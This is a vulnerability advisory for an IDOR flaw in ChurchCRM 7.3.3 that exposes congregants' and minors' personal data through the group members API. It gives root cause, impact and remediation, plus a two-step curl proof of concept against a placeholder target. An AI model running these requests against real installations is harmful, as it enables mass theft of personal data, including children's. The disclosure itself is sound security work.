# IDOR on Group Members — Mass PII Disclosure

**Product:** ChurchCRM  
**Version:** 7.3.3 (earlier versions likely affected)  
**CVE:** Pending  
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key  
**Severity:** High  
**CVSS 4.0:** 7.1 — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`  
**Discovered:** 2026-06-10  
**Author:** Caio Chagas  

---

## Description

The `GET /api/groups/{id}/members` endpoint returns full personal information for every member of any group to any authenticated user. There is no check that the requester belongs to the group or holds any relationship to its members.

## Root Cause

The group members route applies authentication middleware but no object-level authorization for the group being queried. The group ID is taken from the URL path and used directly to retrieve all member records, which are then serialized and returned in full — including name, address, phone, email, date of birth, and family data.

## Impact

- Any authenticated user can enumerate all group IDs (typically small sequential integers) and dump the full contact directory of every congregant organized into groups
- Response data includes complete home addresses, cell phone numbers, email addresses, and birth dates — all the information needed for targeted social engineering or physical harm
- Minors' data is included without restriction; their birth years are present in the response, making this a direct violation of child data protection requirements under GDPR, COPPA, and similar regulations
- A single request to a large group can return hundreds of complete member records in one response

## Proof of Concept

```bash
# Step 1 — authenticate as any low-privilege user
curl -s -c cookies.txt -X POST "http://TARGET/churchcrm/session/begin" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "User=lowpriv&Password=lowpass123"

# Step 2 — retrieve all members of group 1
curl -s -b cookies.txt "http://TARGET/churchcrm/api/groups/1/members"
```

**Expected response (trimmed):**
```json
[
  {
    "id": 101,
    "firstName": "Carol",
    "lastName": "Williams",
    "address": "319 5th St",
    "city": "Kansas City",
    "state": "MO",
    "zip": "64105",
    "cellPhone": "555-0101",
    "email": "carol@example.com",
    "birthYear": 1978,
    "family": { ... }
  },
  {
    "id": 204,
    "firstName": "Joseph",
    "lastName": "Scott",
    "birthYear": 2012,
    ...
  }
]
```

The response for group 1 contained 50+ members with full PII, including minors.

## Evidence

![Full PII returned for arbitrary group](assets/poc.png)
<!-- Add video or additional screenshots to assets/ -->

## Affected Component

| Field | Value |
|-------|-------|
| Endpoint | `GET /api/groups/{id}/members` |
| File | `api/routes/groups/` (group members route) |
| Auth required | Yes — any authenticated user |

## Timeline

| Date | Event |
|------|-------|
| 2026-06-10 | Vulnerability discovered and confirmed |
| 2026-06-10 | Vendor notified via GitHub Security Advisories |
| TBD | CVE ID assigned |
| TBD | Patch released |
| TBD | Public disclosure |

## Remediation

Before returning member data, verify that the requesting user is a member of the queried group, holds a leadership role for it, or is an administrator. At minimum, the response should be scoped to groups the user is already part of.

## References

- [ChurchCRM source](https://github.com/ChurchCRM/CRM)
